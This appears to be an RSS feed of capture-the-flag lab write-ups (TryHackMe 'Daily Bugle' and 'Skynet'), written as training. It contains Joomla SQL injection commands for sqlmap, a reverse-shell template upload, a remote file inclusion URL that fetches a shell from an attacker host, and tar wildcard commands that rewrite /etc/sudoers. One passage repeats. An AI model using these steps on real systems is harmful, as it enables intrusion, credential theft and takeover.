+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 12:05 EDT
+Nmap scan report for 10.10.203.11
+Host is up (0.20s latency).
+Not shown: 995 closed ports
+PORT     STATE    SERVICE       VERSION
+22/tcp   open     ssh           OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
+80/tcp   open     http          Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+|_http-generator: Joomla! - Open Source Content Management
+| http-robots.txt: 15 disallowed entries
+| /joomla/administrator/ /administrator/ /bin/ /cache/
+| /cli/ /components/ /includes/ /installation/ /language/
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+|_http-title: Home
+1119/tcp filtered bnetgame
+1152/tcp filtered winpoplanmess
+3306/tcp open     mysql         MariaDB (unauthorized)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 48.75 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;It looks like we have port 22 and port 80 open. There’s a website with disallowed entries on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; and looks to be running Joomla CMS.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;web enumeration&lt;/h2&gt;
+
+&lt;p&gt;The page is pretty basic for the most part. Looks like one post about spider-man robbing a bank. There’s a login form to the side that gives us an interesting url to test for sqli. Testing out the robots.txt disallowed entries leads me to a Joomla login page. It turns out that in the repos for kali there is a tool for enumerating Joomla called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joomscan&lt;/code&gt;. We can download the tool with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo apt install joomscan&lt;/code&gt;. Once installed we can run it on the box with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joomscan -u http://10.10.60.90/&lt;/code&gt;. It returns all kinds of valuable info such as firewalls, version info, and robots.txt disallowed entries (although we already knew those from the nmap scan). Turns out we’re dealing with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Joomla 3.7.0&lt;/code&gt; which has a known exploit on &lt;a href=&quot;https://www.exploit-db.com/exploits/42033&quot;&gt;exploit-db&lt;/a&gt;. While this is not a manual exploit, it gives us valuable info on how to run sqlmap to get a database dump. It contains the following command:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlmap -u &quot;http://&amp;lt;machine-ip&amp;gt;/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, this command gives us a dump of the databases, but once it returns we’ll need to run it again with a more specific &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-D&lt;/code&gt; to specify one of the databases to dump. A tool like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLmap&lt;/code&gt;, while great is not allowed on the OSCP, so I may go back and try it with a manual exploit (assuming there is one), but for now I need some more practice with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLmap&lt;/code&gt; so I’m not too concerned about it at this point.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/dailybugle/dailybugle_dbs.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is a list of the databases on the backend of the daily bugle’s site. The most interesting looking database is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joomla&lt;/code&gt; database because it probably contains user info for the CMS. We’ll use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLmap&lt;/code&gt; again with a more specific argument to see if we can dump the database.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://&amp;lt;machine-ip&amp;gt;/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla --tables
+
+Database: joomla
+[72 tables]
++----------------------------+
+| #__assets                  |
+| #__associations            |
+| #__banner_clients          |
+| #__banner_tracks           |
+...
+| #__ucm_history             |
+| #__update_sites_extensions |
+| #__update_sites            |
+| #__updates                 |
+| #__user_keys               |
+| #__user_notes              |
+| #__user_profiles           |
+| #__user_usergroup_map      |
+| #__usergroups              |
+| #__users                   |
+| #__utf8_conversion         |
+| #__viewlevels              |
++----------------------------+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The most interesting table is the users table, so lets get more specific with sqlmap. The following command will dump all the columns in the selected table of the database. Admittedly once I saw the password entry in the table I stopped &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLmap&lt;/code&gt;. Otherwise it would’ve taken forever.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://&amp;lt;machine-ip&amp;gt;/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla -T '#__users' --columns
+
+Database: joomla
+Table: #__users
+[5 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| email    | non-numeric |
+| id       | numeric     |
+| name     | non-numeric |
+| password | non-numeric |
+| username | non-numeric |
++----------+-------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally we can run the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLmap&lt;/code&gt; command which will dump the specified columns of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#__users&lt;/code&gt; table on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joomla&lt;/code&gt; database. This should give us a username and hopefully a password hash.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlmap -u &quot;http://10.10.100.104/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla -T '#__users' -C 'username, email, password, id' --dump&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;![](&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/dailybugle/dailybugle_dbs.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is a list of the databases on the backend of the daily bugle’s site. The most interesting looking database is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joomla&lt;/code&gt; database because it probably contains user info for the CMS. We’ll use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLmap&lt;/code&gt; again with a more specific argument to see if we can dump the database.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://&amp;lt;machine-ip&amp;gt;/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla --tables
+
+Database: joomla
+[72 tables]
++----------------------------+
+| #__assets                  |
+| #__associations            |
+| #__banner_clients          |
+| #__banner_tracks           |
+...
+| #__ucm_history             |
+| #__update_sites_extensions |
+| #__update_sites            |
+| #__updates                 |
+| #__user_keys               |
+| #__user_notes              |
+| #__user_profiles           |
+| #__user_usergroup_map      |
+| #__usergroups              |
+| #__users                   |
+| #__utf8_conversion         |
+| #__viewlevels              |
++----------------------------+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The most interesting table is the users table, so lets get more specific with sqlmap. The following command will dump all the columns in the selected table of the database. Admittedly once I saw the password entry in the table I stopped &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLmap&lt;/code&gt;. Otherwise it would’ve taken forever.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://&amp;lt;machine-ip&amp;gt;/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla -T '#__users' --columns
+
+Database: joomla
+Table: #__users
+[5 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| email    | non-numeric |
+| id       | numeric     |
+| name     | non-numeric |
+| password | non-numeric |
+| username | non-numeric |
++----------+-------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally we can run the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLmap&lt;/code&gt; command which will dump the specified columns of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#__users&lt;/code&gt; table on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joomla&lt;/code&gt; database. This should give us a username and hopefully a password hash.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlmap -u &quot;http://10.10.100.104/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla -T '#__users' -C 'username, email, password, id' --dump&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now that we have a password has we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;johntheripper&lt;/code&gt; which comes pre-installed on kali, to identify the type of hash and break it.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/dailybugle/dailybugle_pass.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;initial-foothold&quot;&gt;initial foothold&lt;/h2&gt;
+
+&lt;p&gt;Once inside of the admin panel for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joomla&lt;/code&gt; CMS, the plan is to upload a reverse shell that calls back to my kali machine. Replacing the index.php page of either template we have available and then previewing the template will execute our reverse shell. We’ll need to make sure that we have a netcat listener on our attacking machine before we execute the reverse shell.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/dailybugle/dailybugle_upload.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;usertxt&quot;&gt;user.txt&lt;/h2&gt;
+
+&lt;p&gt;Once on the victim machine, we have to do some enumeration. The first thing I like to do is visit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory to see what kind of usernames I’m dealing with. After that, I’ll either poke around the website to find some passwords or I’ll just run &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&quot;&gt;linpeas.sh&lt;/a&gt;. In this case, I’m feeling a little lazy and I’ll just run linpeas.sh. After that runs I found a password from a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configuration.php&lt;/code&gt; file. I tried that password on a whim for the user I discovered earlier and that got a shell as that user. Now it’s time to get a more stable shell and get on the box via ssh and grab the user flag.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/dailybugle/dailybugle_peas.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/dailybugle/dailybugle_user.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;roottxt&quot;&gt;root.txt&lt;/h2&gt;
+
+&lt;p&gt;One of the first things I do when I’m trying to get root is run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; to give me a list of all the commands I can run as root. This one returns the following line:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(ALL) NOPASSWD: /usr/bin/yum&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Anytime I encounter a situation like this I head to &lt;a href=&quot;https://gtfobins.github.io/gtfobins/yum/&quot;&gt;GTFOBins&lt;/a&gt;. Taking a look at yum, which is a package manager for red hat, like apt is for debian (is my understanding, I’ve never run fedora, #debian based distros ftw), it appears we can simply do some copy and pasting from (b) section on the article on yum which enables a yum plugin that dumps us into a root shell.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/dailybugle/dailybugle_root.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;final-thoughts&quot;&gt;final thoughts&lt;/h2&gt;
+
+&lt;p&gt;This one was a doozy. I think the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLmap&lt;/code&gt; was the hardest part of this room. The admin panel took a minute as well to figure out where I needed to upload. The root was probably the easiest part. Anyway, I learned a good amount and I got some practice with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLmap&lt;/code&gt; as well. Thanks for reading if you’ve come this far, and a big thanks to all the folks who made this box.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Thu, 17 Sep 2020 00:00:00 -0500</pubDate>
+        <link>http://localhost:8000//Daily_Bugle</link>
+        <link href="http://localhost:8000/Daily_Bugle"/>
+        <guid isPermaLink="true">http://localhost:8000/Daily_Bugle</guid>
+      </item>
+    
+      <item>
+        <title>Skynet Writeup</title>
+        <description>&lt;h1 id=&quot;tryhackme---skynet&quot;&gt;TryHackMe - Skynet&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;This room continues my journey down the Offensive Security Path on &lt;a href=&quot;https://tryhackme.com/&quot;&gt;TryHackMe&lt;/a&gt;. This is a Terminator themed room, and I’m excited to see what’s in store.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap-scan&quot;&gt;nmap scan&lt;/h2&gt;
+
+&lt;p&gt;The first step is to run a typical nmap scan on the box to see what services are running. Here’s the reults of the scan.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sC -sV -oN nmap/skynet_scan.txt 10.10.134.55
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-05 22:04 CDT
+Nmap scan report for 10.10.134.55
+Host is up (0.20s latency).
+Not shown: 991 closed ports
+PORT     STATE    SERVICE     VERSION
+22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
+|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
+|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
+80/tcp   open     http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Skynet
+110/tcp  open     pop3        Dovecot pop3d
+|_pop3-capabilities: UIDL TOP SASL AUTH-RESP-CODE CAPA PIPELINING RESP-CODES
+139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp  open     imap        Dovecot imapd
+|_imap-capabilities: ENABLE more LOGIN-REFERRALS listed post-login IDLE Pre-login ID capabilities LOGINDISABLEDA0001 LITERAL+ have OK IMAP4rev1 SASL-IR
+445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+1296/tcp filtered dproxy
+1999/tcp filtered tcp-id-port
+2100/tcp filtered amiganetfs
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h40m14s, deviation: 2h53m12s, median: 13s
+|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: skynet
+|   NetBIOS computer name: SKYNET\x00
+|   Domain name: \x00
+|   FQDN: skynet
+|_  System time: 2020-09-05T22:05:03-05:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2020-09-06T03:05:03
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.22 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looks like we’ve got &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt;, as well as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;imap&lt;/code&gt;. It also appears that the system is running linux.&lt;/p&gt;
+
+&lt;h2 id=&quot;smb-enumeration&quot;&gt;SMB Enumeration&lt;/h2&gt;
+
+&lt;p&gt;There’s a lot to look at but the first thing I think is interesting is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb&lt;/code&gt;, but I’m going to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enum4linux&lt;/code&gt; to gain some initial knowledge about the shares among other things like usernames.&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/skynet/skynet_enum4linux.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see there’s an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt; smb share that we can access. Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbmap&lt;/code&gt; we can see what’s all located inside of the anonymous file share. From there we can see a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attention.txt&lt;/code&gt;.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/skynet/skynet_smb.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat 10.10.29.100-anonymous_attention.txt
+A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+-Miles Dyson
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The other interesting thing is the directory labeled &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logs&lt;/code&gt;. It contains three files, but it appears that only one of the files, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log1.txt&lt;/code&gt;, has anything in it. Opening up the log1.txt reveals a list of what looks like passwords.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
+
+&lt;p&gt;After trying the passwords on user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;milesdyson&lt;/code&gt;’s smb share and getting no luck. I tried my hand at the website running on port 80. I ran gobuster and the site and got the following in return:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/admin (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/config (Status: 301)
+/ai (Status: 301)
+/squirrelmail (Status: 301)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; page got us nowhere, but the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;squirrelmail&lt;/code&gt; page redirected to a login. Let’s see if burpsuite can get us into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;milesdyson&lt;/code&gt;’s email.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/skynet/skynet_burpintrude.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cyborg007haloterminator&lt;/code&gt; looks promising because the response is different from the others. Trying it gains us access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;milesdyson&lt;/code&gt;’s email which has a very interesting email about an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb&lt;/code&gt; password reset.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/skynet/skynet_smbmiles.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The password for his smb share is )s{A&amp;amp;2Z=F^n_E.B`. We can login to the smbshare with milesdyson’s creds by typing in:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient //10.10.132.87/milesdyson -U milesdyson&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;followed by his password. Inside we see quite the list of pdfs on neural nets and the like. Anyway, there is a directory called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;notes&lt;/code&gt; that looks promising. We can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt; into that and see all kinds of crazy notes, but one of them is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;important.txt&lt;/code&gt;. We can grab that file with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get important.txt&lt;/code&gt;. The file contains:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;This to-do list shows us that the website has a beta CMS (content management system). That’s always a good place to look as an attacker. Navigating to the directory shows us:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/skynet/skynet_miles.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nothing much going on here either on the page itself or in the source code. I think it’s time to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and see what we can find out.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster dir -u http://10.10.132.87/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o skynet_miles_gobuster.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.132.87/45kra24zxs28v3yd/
+[+] Threads:        100
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/09 13:41:25 Starting gobuster
+===============================================================
+/administrator (Status: 301)
+===============================================================
+2020/09/09 13:48:46 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The only directory that gobuster got a hit on was administrator so we’ll take a look there. Once we get there we’re greeted with a login to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cuppa CMS&lt;/code&gt;. Researching Cuppa CMS reveals some vulnerabilities. The most enticing is the remote file inclusion. We can add this to our cuppa loin url in order to call back a shell to our attacking machine.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.141.144/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://&amp;lt;attacking-ip&amp;gt;:&amp;lt;port&amp;gt;/php-reverse-shell.php&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/skynet/skynet_initialshell.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once on the victim machine I figured out that I can quickly switch to user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;milesdyson&lt;/code&gt; with the password recovered from before. From here it’s an easy grab for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;. There’s also something interesting going on with the backup script. Checking out crontab it appears to be running every 30 seconds. We should try to hijack this and get a reverse shell as root.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/skynet/skynet_su.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;That tar command looks enticing. If we cd into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; we can construct a script that allows the user milesdyson to run all commands as sudo. As it turns out only the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; user can write to that directory soooo time to switch back to that user and run the following commands (idea for priv esc came from &lt;a href=&quot;https://gtfobins.github.io/gtfobins/tar/&quot;&gt;GTFOBins&lt;/a&gt; and from &lt;a href=&quot;https://medium.com/@int0x33/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e&quot;&gt;this article from int0x33&lt;/a&gt;).
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo 'echo &quot;www-data ALL=(root) NOPASSWD: ALL&quot; &amp;gt; /etc/sudoers' &amp;gt; privesc.sh
+echo &quot;&quot; &amp;gt; &quot;--checkpoint-action=exec=sh privesc.sh&quot;
+echo &quot;&quot; &amp;gt; --checkpoint=1
